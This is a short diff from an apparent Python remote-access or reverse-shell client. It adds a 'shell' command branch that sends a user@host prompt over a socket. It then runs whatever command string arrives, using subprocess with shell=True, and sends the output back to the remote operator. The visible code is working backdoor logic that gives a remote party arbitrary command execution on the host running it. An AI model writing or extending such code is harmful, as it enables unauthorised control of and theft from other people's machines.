@@ -73,13 +73,19 @@ Processor Architecture: {platform.processor()}
             sock.send(b"exit")
             break
 
-        else:
+        elif cmd == "shell":
+            header = f"""({getpass.getuser()}@{platform.node()})> """
+            sock.send(header.encode())
+            STDOUT, STDERR = None, None
+            cmd = sock.recv(1024).decode("utf-8")
             comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             STDOUT, STDERR = comm.communicate()
             if not STDOUT:
                 sock.send(STDERR)
             else:
                 sock.send(STDOUT)
+        else:
+            print(E+"Unrecognized command!")
 
         if not cmd:
             break
